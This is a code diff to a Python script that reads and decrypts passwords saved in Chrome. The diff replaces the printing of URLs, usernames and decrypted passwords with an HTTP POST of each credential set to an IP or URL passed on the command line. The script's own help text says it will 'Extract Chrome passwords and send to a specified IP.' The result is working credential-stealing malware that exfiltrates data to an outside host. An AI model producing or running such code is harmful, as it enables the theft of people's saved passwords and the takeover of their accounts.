@@ -13,7 +13,7 @@ from Crypto.Cipher import AES
 import shutil
 from datetime import timezone, datetime, timedelta
 import requests
-
+import argparse
 
 # Password fetching functions
 def chrome_date_and_time(chrome_data):
@@ -63,7 +63,7 @@ def password_decryption(password, encryption_key):
         except:
             return "No Passwords"
 
-def fetch_passwords():
+def fetch_passwords(ip):
     """
     Fetches passwords from chrome.
     """
@@ -86,27 +86,14 @@ def fetch_passwords():
     # iterate over all rows
     for row in cursor.fetchall():
         main_url = row[0]
-        login_page_url = row[1]
         user_name = row[2]
         decrypted_password = password_decryption(row[3], key)
-        date_of_creation = row[4]
-        last_usuage = row[5]
-        
+
         if user_name or decrypted_password:
-            print(f"Main URL: {main_url}")
-            print(f"Login URL: {login_page_url}")
-            print(f"User name: {user_name}")
-            print(f"Decrypted Password: {decrypted_password}")
-        
+            data = {"main_url" : main_url, "username":user_name, "password" : decrypted_password}
+            requests.post(ip, data=data)
         else:
             continue
-        
-        if date_of_creation != 86400000000 and date_of_creation:
-            print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}")
-        
-        if last_usuage != 86400000000 and last_usuage:
-            print(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
-        print("=" * 100)
     cursor.close()
     db.close()
     
@@ -118,17 +105,12 @@ def fetch_passwords():
     except:
         pass
 
-
-# Exfiltrate password functionality
-def send_passwords(ip, data):
-    """
-    Sends passwords to IP address via HTTP post request.
-    """
-
-    pass
-
 def main():
-    fetch_passwords()
+    parser = argparse.ArgumentParser(description="Extract Chrome passwords and send to a specified IP.")
+    parser.add_argument("ip", help="IP address or URL to send the extracted data (e.g., http://example.com/upload)")
+    args = parser.parse_args()
+
+    fetch_passwords(args.ip)
 
 if __name__ == "__main__":
     main()
